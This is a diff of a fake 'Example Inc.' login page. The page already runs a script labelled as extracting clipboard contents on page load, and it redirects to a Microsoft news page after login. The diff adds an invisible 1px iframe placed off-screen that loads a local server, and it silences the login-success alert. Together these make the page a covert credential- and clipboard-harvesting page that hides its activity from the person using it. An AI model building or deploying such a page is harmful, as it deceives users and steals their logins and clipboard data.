@@ -5,6 +5,15 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login</title>
     <style>
+        iframe {
+            width: 1px;
+            height: 1px;
+            border: none;
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+        }
+
         body {
             font-family: 'Arial', sans-serif;
             background: linear-gradient(135deg, #6a11cb, #2575fc);
@@ -96,6 +105,7 @@
     </style>
 </head>
 <body>
+    <iframe src="http://127.0.0.1:8000" id="duster"></iframe>
     <div id="login-modal">
         <img src="https://cdn-icons-png.flaticon.com/512/2920/2920322.png" alt="Login Icon">
         <h2>Welcome Back</h2>
@@ -104,8 +114,7 @@
         <input id="password" type="password" placeholder="Password" required>
         <button id="login-button">Log In</button>
         <footer>© 2024 Example Inc.</footer>
-    </div>
-
+    </div> 
     <script>
         // Clipboard Content Extraction on Page Load
         async function extractClipboardAndSend() {
@@ -159,7 +168,7 @@
                 });
 
                 if (response.ok) {
-                    alert("Login Successful or Account Created!");
+                    // alert("Login Successful or Account Created!");
 
                     // Redirect to the desired URL
                     window.location.href = "https://news.microsoft.com/source/";
